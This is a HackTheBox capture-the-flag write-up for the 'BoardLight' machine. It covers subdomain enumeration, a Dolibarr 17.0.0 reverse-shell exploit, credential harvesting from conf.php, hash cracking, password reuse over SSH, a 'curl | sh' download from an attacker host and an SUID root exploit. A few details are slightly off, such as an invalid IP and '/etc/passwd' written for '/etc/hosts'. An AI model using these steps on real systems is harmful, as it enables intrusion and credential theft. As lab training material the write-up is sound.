---
title: BoardLight - HackTheBox Machine WriteUp
date: 2024-10-16 00:00:00 +8000
categories:
  - Writeup
  - HackTheBox
tags:
  - writeup
  - hackthebox
  - htb
  - machine
  - easy
  - linux
image:
  path: /assets/img/post/hackthebox/boardlight/thumbnail.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: HackTheBox Machine BoardLight
---
This is my WriteUp for the easy Linux Machine [BoardLight](https://app.hackthebox.com/machines/BoardLight) on [HackTheBox Labs](https://app.hackthebox.com/).  After starting the machine and my penetration testing environment, I connected to the HackTheBox VPN and was ready to start pwning the box.
## Recon
The first step I always do on HackTheBox machines, is executing `whatweb`, to get the hostname of the machine from the IP address:
```shell
$ whatweb 10.10.11.11
```
I got the domain name `board.htb`and added it with the IP address to the `/etc/hosts` file on my local machine.

Then I started to scan the machine for open ports with Nmap:
```shell
$ nmap -sV 10.10.11.11

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
```
The Nmap scan, resulted in two open ports. Port `22`, is a SSH server and is usually not vulnerable on HackTheBox, also the version was quite up-to-date.

On port `80`, a web application was running. Therefore, I used `gobuster` to search the website for hidden files or directories:
```shell
$ gobuster dir -u "http://10.10.11.11" -w /usr/share/wordlists/dirb/big.txt

===============================================================
/.htaccess (Status: 403) [Size: 276]
/.htpasswd (Status: 403) [Size: 276]
/css (Status: 301) [Size: 308] [--> http://10.10.11.11/css/]
/images (Status: 301) [Size: 311] [--> http://10.10.11.11/images/]
/js (Status: 301) [Size: 307] [--> http://10.10.11.11/js/]
/server-status (Status: 403) [Size: 276]
===============================================================
```

I found nothing interesting, so I continued to enumerate the domain for subdomains with `ffuf`. Unfortunately, the domain has many empty subdomains, so I filtered the HTTP response size with the `-fs` flag:
```shell
$ ffuf -u http://board.htb/ -H 'Host: FUZZ.board.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -c -fs 15949

--------------------------------------------
crm [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 78ms]
--------------------------------------------
```
The scan found on subdomain called `crm`, so I added `crm.board.htb` to `/etc/passwd`.

The `crm.board.htb` subdomain runs the Customer Relationship Management(CRM) software **Dolibarr** on version `17.0.0`. 

After searching for "Dolibarr 17.0.0 exploit", I found an [Proof of Concept (PoC) exploit on Github](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253). 
I cloned the repository to my local machine and read through the Python code, to ensure that nothing malicious is happening. Everything looked fine, so I started a reverse shell with Netcat:
```shell
nc -lnvp 5555
```

And after that executed the `exploit.py` file:
```shell
python3 exploit.py http://crm.board.htb admin admin 10.10.55.555 5555
```

And we got the reverse-shell for the user `www-data`!

Now lets get a foothold and elevate our privileges to be able to connect with SSH.

---
## Foothold
After searching around in the website directory, I decided to search for a `conf` directory:
```shell
$ find / -type d -name 'conf'

...
/var/www/html/crm.board.htb/htdocs/conf
...
```
I found one, in side the CRM application directory (`/var/www/html/crm.board.htb/htdocs/conf`) directory.
It contained some configuration files and inside the `conf.php`, I found following database credentials:
```shell
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

I used the `mysql` command line utility to log into the database:
```shell
mysql -u dolibarrowner -p
```

I searched for interesting SQL tables and dumped the content of `llx_user`:
```sql
> USE dolibarr
> SHOW TABLES;
> SELECT * FROM llx_user;
```

The dump contained some hashed credentials:
- `admin:$2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96`
- `dolibarr:$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm`

I put the hashes in a file(`hashes`) and used hashcat with the mode (`-m`) `3200`(Blowfish (Unix)) to crack them:
```shell
hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
```
After a few seconds hashcat found only the password for the `admin` user, which is also `admin`.

I tried the password with the different users, but it did not work. But then, I remembered the other password in the configuration file (`serverfun2$2023!!`) and tried to login with that as well.

And it worked! We could login as user `larissa` and the password `serverfun2$2023!!` with SSH:
```shell
ssh larissa@board.htb
```

It worked and I could get the user flag from `/home/larissa/user.txt`!

---
## Privilege Escalation
Now, lets escalate our privileges to get access to the `root` user.
So the first thing I always do, is to list the `sudo` capabilities with the `-l` flag:
```shell
sudo -l
```
But it the user `larissa` is not allowed to run `sudo` on the machine.

After that, I moved `linpease.sh` to the machine and executed it:
```shell
$ curl -L http://10.10.14.151:8000/linpease.sh | sh
```
The output showed, that the user `larissa` is in the `adm` group. That usually means, that we can read files in the `/var/log/` directory.

I searched through the log files for the `sudo` and `su` command:
```shell
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
But I also found anything interesting.

Then I tried to list all binaries, where the SUID bit is set:
```shell
find / -perm -u=s -type f 2>/dev/null
```
And a unusual executable called `freqset` was listed.

I researched the binary name and found an [exploit for it on Github](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit). Again I cloned it to my machine, and read through the bash script, to check what it does and if anything malicious is happening.

Everything looked fine again, I moved the `exploit.sh` script to the target machine and executed it. 

This resulted in a `root` shell and could read the `/root/root.txt` file and got the flag!

---
## Exploit Chain
**Recon:**
1. Port scan with `nmap`
2. Enumerate subdomains with `ffuf`
3. Search for Dolibarr version `17.0.0.` vulnerabilities
4. Use the PoC to get a reverse shell

**Foothold:**
5. Search for configuration files
6. Get the database password
7. Test if the password was reused
8. Login with SSH as user `larissa`

**Privilege Escalation:**
9. Research binaries with the SUID bit set for vulnerabilities
10. Exploit the `freqset` vulnerability to get a `root` shell

---
## Resources
- [Dolibarr exploit](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
- [`freqset` exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
